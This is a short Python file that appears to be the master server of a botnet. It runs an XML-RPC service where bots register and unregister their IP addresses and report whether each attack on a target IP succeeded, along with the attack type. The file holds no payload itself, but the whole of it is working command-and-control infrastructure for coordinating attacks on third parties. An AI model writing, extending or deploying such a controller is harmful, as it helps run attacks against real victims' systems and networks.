from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
import socket
from time import gmtime, strftime


class RequestHandler(SimpleXMLRPCRequestHandler):
    rpc_paths = ("/RPC2",)


def getMasterIpAddress():
    return socket.gethostbyname(socket.gethostname())


def registerIP(ip_address):
    with open("botnet_list.txt", "a") as file:
        file.write(ip_address+"\n")


def unregisterIP(ip_address):
    ip_list = []
    with open("botnet_list.txt", "r") as file:
        ip_list = file.readlines()
        ip_list = [x.strip() for x in ip_list]
        try:
            ip_list.remove(ip_address)
        except ValueError:
            print("Already removed!")

    with open("botnet_list.txt", "w") as file:
        for ip in ip_list:
            file.write(ip+"\n")


def getLogFromBotnet(ip_botnet, ip_target, status, attack_type):
    with open("log.txt", "a") as file:
        if status == "success":
            file.write("("+strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ") " +
                       ip_botnet+" successfully attack " + ip_target + " with " + attack_type + "\n")
        elif status == "failed":
            file.write("("+strftime("%Y-%m-%d %H:%M:%S", gmtime()) +
                       ") " + ip_botnet+" failed to attack " + ip_target + "\n")


if __name__ == '__main__':
    print("Listening botnet request(s) on " + getMasterIpAddress())
    server = SimpleXMLRPCServer(
        (getMasterIpAddress(), 8000), requestHandler=RequestHandler, allow_none=True)
    server.register_introspection_functions()
    server.register_function(registerIP, "register_ip")
    server.register_function(unregisterIP, "unregister_ip")
    server.register_function(getLogFromBotnet, "inform_master")
    server.serve_forever()
